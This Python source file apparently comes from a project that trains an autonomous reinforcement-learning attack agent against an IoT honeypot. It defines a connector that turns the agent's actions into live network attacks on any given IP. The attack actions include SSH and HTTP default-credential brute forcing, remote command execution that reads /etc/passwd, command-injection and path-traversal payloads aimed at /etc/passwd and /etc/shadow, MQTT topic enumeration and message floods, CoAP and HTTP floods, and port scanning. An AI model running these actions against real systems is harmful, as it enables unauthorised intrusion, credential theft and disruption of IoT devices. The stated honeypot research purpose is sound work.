# ================================================================
# Live Connector — Translates RL actions into real network packets
# Phase 1: Test agent against real honeypot
# Protocols: SSH (paramiko), MQTT (paho), HTTP (requests), Network (scapy)
# ================================================================
import time
import socket
import warnings
import concurrent.futures

warnings.filterwarnings('ignore')

_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=4)


def _run_with_timeout(fn, timeout, fallback):
    """Run fn() in a thread. Return fallback if it exceeds timeout seconds."""
    future = _EXECUTOR.submit(fn)
    try:
        return future.result(timeout=timeout)
    except concurrent.futures.TimeoutError:
        return fallback
    except Exception as e:
        fallback['error'] = str(e)
        return fallback


class LiveConnector:
    """
    Translates abstract RL actions into real network packets
    and parses responses back into state features.
    """

    def __init__(self, target_ip, ssh_port=22, mqtt_port=1883,
                 http_port=8080, coap_port=5683, timeout=3):
        self.target_ip = target_ip
        self.ssh_port = ssh_port
        self.mqtt_port = mqtt_port
        self.http_port = http_port
        self.coap_port = coap_port
        self.timeout = timeout          # hard wall-clock timeout for every action

        self._mqtt_client = None
        self._ssh_client = None

    # ── internal timeout fallback ────────────────────────────────
    def _fail(self, protocol='unknown'):
        return {
            'success': False, 'protocol': protocol,
            'response': {'status_code': 0, 'response_time': self.timeout},
        }

    # ----------------------------------------------------------------
    # MQTT Actions
    # ----------------------------------------------------------------
    def mqtt_connect(self):
        def _do():
            try:
                import paho.mqtt.client as mqtt
                client = mqtt.Client(client_id=f'rl_agent_{int(time.time())}')
                client.connect(self.target_ip, self.mqtt_port, keepalive=5)
                self._mqtt_client = client
                return {
                    'success': True, 'protocol': 'MQTT',
                    'response': {'status_code': 200, 'response_time': 0.01},
                    'subscribed': False, 'messages_received': 0,
                }
            except Exception as e:
                return {**self._fail('MQTT'), 'error': str(e)}
        return _run_with_timeout(_do, self.timeout, self._fail('MQTT'))

    def mqtt_subscribe_wildcard(self):
        def _do():
            try:
                if self._mqtt_client is None:
                    self.mqtt_connect()
                messages = []
                self._mqtt_client.on_message = lambda c, u, m: messages.append(m)
                self._mqtt_client.subscribe('#', qos=0)
                self._mqtt_client.loop_start()
                time.sleep(min(0.5, self.timeout * 0.3))   # bounded sleep
                self._mqtt_client.loop_stop()
                return {
                    'success': True, 'protocol': 'MQTT',
                    'response': {'status_code': 200, 'response_time': 0.5},
                    'subscribed': True, 'messages_received': len(messages),
                }
            except Exception as e:
                return {**self._fail('MQTT'), 'error': str(e)}
        return _run_with_timeout(_do, self.timeout, self._fail('MQTT'))

    def mqtt_publish_flood(self, count=100):
        def _do():
            try:
                if self._mqtt_client is None:
                    self.mqtt_connect()
                start = time.time()
                for i in range(count):
                    self._mqtt_client.publish(
                        'home/sensor/temperature',
                        payload=f'{{"temp": {20 + i}, "flood": true}}',
                        qos=0,
                    )
                elapsed = time.time() - start
                return {
                    'success': True, 'protocol': 'MQTT',
                    'response': {'status_code': 200, 'response_time': elapsed},
                    'messages_sent': count,
                }
            except Exception as e:
                return {**self._fail('MQTT'), 'error': str(e)}
        return _run_with_timeout(_do, self.timeout, self._fail('MQTT'))

    def mqtt_topic_enum(self):
        def _do():
            patterns = [
                'home/#', 'device/#', 'sensor/#', 'actuator/#',
                '+/status', '+/config', '+/data', 'sys/#',
            ]
            try:
                if self._mqtt_client is None:
                    self.mqtt_connect()
                discovered = []
                self._mqtt_client.on_message = lambda c, u, m: discovered.append(m.topic)
                for pattern in patterns:
                    self._mqtt_client.subscribe(pattern, qos=0)
                self._mqtt_client.loop_start()
                time.sleep(min(0.5, self.timeout * 0.3))   # was 1.0 — this was the hang
                self._mqtt_client.loop_stop()
                topics_found = list(set(discovered))
                return {
                    'success': len(topics_found) > 0, 'protocol': 'MQTT',
                    'response': {'status_code': 200, 'response_time': 0.5},
                    'topics_found': topics_found,
                }
            except Exception as e:
                return {**self._fail('MQTT'), 'error': str(e)}
        return _run_with_timeout(_do, self.timeout, self._fail('MQTT'))

    # ----------------------------------------------------------------
    # HTTP Actions
    # ----------------------------------------------------------------
    def http_get_scan(self):
        def _do():
            import requests as req
            endpoints = ['/', '/api', '/admin']
            results = []
            for ep in endpoints:
                try:
                    start = time.time()
                    r = req.get(
                        f'http://{self.target_ip}:{self.http_port}{ep}',
                        timeout=self.timeout,
                    )
                    elapsed = time.time() - start
                    results.append({'endpoint': ep, 'status': r.status_code,
                                    'response_time': elapsed, 'size': len(r.content)})
                except Exception:
                    results.append({'endpoint': ep, 'status': 0,
                                    'response_time': self.timeout})
            found = [r for r in results if r['status'] in [200, 201, 301, 302, 401, 403]]
            return {
                'success': len(found) > 0, 'protocol': 'HTTP',
                'response': {
                    'status_code': found[0]['status'] if found else 0,
                    'response_time': found[0]['response_time'] if found else self.timeout,
                },
                'endpoints_found': len(found),
                'total_scanned': len(endpoints),
            }
        return _run_with_timeout(_do, self.timeout * 4, self._fail('HTTP'))

    def http_post_exploit(self):
        def _do():
            import requests as req
            payloads = [
                {'endpoint': '/api/exec',    'data': {'cmd': 'id'}},
                {'endpoint': '/api/config',  'data': {'admin': True, 'debug': True}},
                {'endpoint': '/cgi-bin/test','data': {'input': '; cat /etc/passwd'}},
            ]
            for payload in payloads:
                try:
                    start = time.time()
                    r = req.post(
                        f'http://{self.target_ip}:{self.http_port}{payload["endpoint"]}',
                        json=payload['data'], timeout=self.timeout,
                    )
                    elapsed = time.time() - start
                    if r.status_code in [200, 201, 500]:
                        return {
                            'success': True, 'protocol': 'HTTP',
                            'response': {'status_code': r.status_code,
                                         'response_time': elapsed},
                        }
                except Exception:
                    continue
            return self._fail('HTTP')
        return _run_with_timeout(_do, self.timeout * 3, self._fail('HTTP'))

    def http_path_traversal(self):
        def _do():
            import requests as req
            paths = [
                '/../../../etc/passwd',
                '/..%2f..%2f..%2fetc%2fpasswd',
                '/api/files?path=../../../etc/shadow',
                '/download?file=../../../../etc/hosts',
            ]
            for path in paths:
                try:
                    start = time.time()
                    r = req.get(
                        f'http://{self.target_ip}:{self.http_port}{path}',
                        timeout=self.timeout,
                    )
                    elapsed = time.time() - start
                    if 'root:' in r.text or r.status_code == 200:
                        return {
                            'success': True, 'protocol': 'HTTP',
                            'response': {'status_code': r.status_code,
                                         'response_time': elapsed},
                        }
                except Exception:
                    continue
            return {**self._fail('HTTP'), 'response': {'status_code': 404,
                                                        'response_time': self.timeout}}
        return _run_with_timeout(_do, self.timeout * 4, self._fail('HTTP'))

    def http_brute_force(self):
        def _do():
            import requests as req
            creds = [('admin', 'admin'), ('root', 'root')]
            for user, pwd in creds:
                try:
                    start = time.time()
                    r = req.get(
                        f'http://{self.target_ip}:{self.http_port}/admin',
                        auth=(user, pwd), timeout=self.timeout,
                    )
                    elapsed = time.time() - start
                    if r.status_code == 200:
                        return {
                            'success': True, 'protocol': 'HTTP',
                            'response': {'status_code': 200, 'response_time': elapsed},
                            'auth_success': True,
                        }
                except Exception:
                    continue
            return {**self._fail('HTTP'), 'response': {'status_code': 401,
                                                        'response_time': self.timeout},
                    'auth_success': False}
        return _run_with_timeout(_do, self.timeout * 2, self._fail('HTTP'))

    # ----------------------------------------------------------------
    # SSH Actions
    # ----------------------------------------------------------------
    def ssh_brute_force(self):
        def _do():
            try:
                import paramiko
                creds = [('root', 'root'), ('admin', 'admin')]
                for user, pwd in creds:
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(
                            self.target_ip, port=self.ssh_port,
                            username=user, password=pwd,
                            timeout=self.timeout,
                            allow_agent=False, look_for_keys=False,
                        )
                        self._ssh_client = client
                        return {
                            'success': True, 'protocol': 'SSH',
                            'response': {'status_code': 200, 'response_time': 1.0},
                            'auth_success': True, 'banner_grabbed': True,
                        }
                    except paramiko.AuthenticationException:
                        continue
                    except Exception:
                        break
            except ImportError:
                pass
            return {**self._fail('SSH'), 'response': {'status_code': 401,
                                                       'response_time': self.timeout},
                    'auth_success': False}
        return _run_with_timeout(_do, self.timeout * 2, self._fail('SSH'))

    def ssh_exploit(self):
        def _do():
            if self._ssh_client is None:
                result = self.ssh_brute_force()
                if not result.get('auth_success'):
                    return result
            try:
                stdin, stdout, stderr = self._ssh_client.exec_command(
                    'id; uname -a; cat /etc/passwd',
                    timeout=self.timeout,
                )
                output = stdout.read().decode('utf-8', errors='ignore')
                return {
                    'success': True, 'protocol': 'SSH',
                    'response': {'status_code': 200, 'response_time': 0.5},
                    'command_output': output[:500],
                }
            except Exception as e:
                return {**self._fail('SSH'), 'error': str(e)}
        return _run_with_timeout(_do, self.timeout * 2, self._fail('SSH'))

    # ----------------------------------------------------------------
    # Network Actions
    # ----------------------------------------------------------------
    def tcp_syn_scan(self, ports=None):
        def _do():
            _ports = ports or [22, 80, 1883, 5683, 8080]
            open_ports = []
            for port in _ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    if sock.connect_ex((self.target_ip, port)) == 0:
                        open_ports.append(port)
                    sock.close()
                except Exception:
                    continue
            return {
                'success': len(open_ports) > 0, 'protocol': 'TCP',
                'response': {'status_code': 200 if open_ports else 0,
                             'response_time': len(_ports) * 0.5},
                'open_ports': open_ports, 'total_scanned': len(_ports),
            }
        return _run_with_timeout(_do, self.timeout * 5, self._fail('TCP'))

    def icmp_ping_sweep(self):
        def _do():
            import subprocess
            result = subprocess.run(
                ['ping', '-c', '2', '-W', '1', self.target_ip],
                capture_output=True, text=True, timeout=5,
            )
            alive = result.returncode == 0
            return {
                'success': alive, 'protocol': 'ICMP',
                'response': {'status_code': 200 if alive else 0, 'response_time': 2.0},
            }
        return _run_with_timeout(_do, self.timeout * 2, self._fail('ICMP'))

    # ----------------------------------------------------------------
    # Dispatch
    # ----------------------------------------------------------------
    def execute(self, action_name):
        dispatch = {
            'mqtt_connect':            self.mqtt_connect,
            'mqtt_subscribe_wildcard': self.mqtt_subscribe_wildcard,
            'mqtt_publish_flood':      self.mqtt_publish_flood,
            'mqtt_topic_enum':         self.mqtt_topic_enum,
            'mqtt_large_payload':      lambda: self.mqtt_publish_flood(count=500),
            'http_get_scan':           self.http_get_scan,
            'http_post_exploit':       self.http_post_exploit,
            'http_path_traversal':     self.http_path_traversal,
            'http_brute_force':        self.http_brute_force,
            'http_large_payload':      self._http_large_payload,
            'coap_get_discover':       self._coap_discover,
            'coap_path_scan':          self._coap_path_scan,
            'coap_flood':              self._coap_flood,
            'tcp_syn_scan':            self.tcp_syn_scan,
            'tcp_port_scan':           lambda: self.tcp_syn_scan(
                                           [22, 80, 443, 1883, 5683, 8080, 8443, 8883, 9090, 3000]),
            'tcp_ssh_brute':           self.ssh_brute_force,
            'tcp_exploit_attempt':     self.ssh_exploit,
            'icmp_ping_sweep':         self.icmp_ping_sweep,
        }
        handler = dispatch.get(action_name)
        if handler:
            return handler()
        return {'success': False, 'error': f'Unknown action: {action_name}'}

    # ----------------------------------------------------------------
    # Private helpers
    # ----------------------------------------------------------------
    def _http_large_payload(self):
        def _do():
            import requests as req
            payload = 'A' * 100000
            start = time.time()
            r = req.post(
                f'http://{self.target_ip}:{self.http_port}/api/data',
                data=payload, timeout=self.timeout,
            )
            elapsed = time.time() - start
            return {
                'success': r.status_code in [200, 413, 500], 'protocol': 'HTTP',
                'response': {'status_code': r.status_code, 'response_time': elapsed},
            }
        return _run_with_timeout(_do, self.timeout, self._fail('HTTP'))

    def _coap_discover(self):
        def _do():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(min(2, self.timeout))   # was missing — caused hang
                coap_msg = bytes([0x40, 0x01, 0x00, 0x01]) + b'\xBB.well-known\x04core'
                sock.sendto(coap_msg, (self.target_ip, self.coap_port))
                data, _ = sock.recvfrom(4096)
                sock.close()
                return {
                    'success': True, 'protocol': 'CoAP',
                    'response': {'status_code': 200, 'response_time': 0.5},
                    'resources_found': len(data),
                }
            except Exception as e:
                return {**self._fail('CoAP'), 'error': str(e)}
        return _run_with_timeout(_do, self.timeout, self._fail('CoAP'))

    def _coap_path_scan(self):
        def _do():
            paths = ['/sensor', '/actuator', '/config', '/status', '/device']
            found = 0
            for path in paths:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(min(1, self.timeout))
                    path_opt = bytes([len(path) - 1 | 0xB0]) + path[1:].encode()
                    coap_msg = bytes([0x40, 0x01, 0x00, 0x02]) + path_opt
                    sock.sendto(coap_msg, (self.target_ip, self.coap_port))
                    sock.recvfrom(4096)
                    found += 1
                    sock.close()
                except Exception:
                    continue
            return {
                'success': found > 0, 'protocol': 'CoAP',
                'response': {'status_code': 200 if found else 0, 'response_time': 2.0},
                'paths_found': found,
            }
        return _run_with_timeout(_do, self.timeout * len(['/sensor','/actuator',
                                                           '/config','/status','/device']),
                                  self._fail('CoAP'))

    def _coap_flood(self):
        def _do():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for i in range(200):
                coap_msg = bytes([0x40, 0x01, (i >> 8) & 0xFF, i & 0xFF])
                sock.sendto(coap_msg, (self.target_ip, self.coap_port))
            sock.close()
            return {
                'success': True, 'protocol': 'CoAP',
                'response': {'status_code': 200, 'response_time': 1.0},
                'packets_sent': 200,
            }
        return _run_with_timeout(_do, self.timeout, self._fail('CoAP'))

    def cleanup(self):
        if self._mqtt_client:
            try:
                self._mqtt_client.disconnect()
            except Exception:
                pass
        if self._ssh_client:
            try:
                self._ssh_client.close()
            except Exception:
                pass
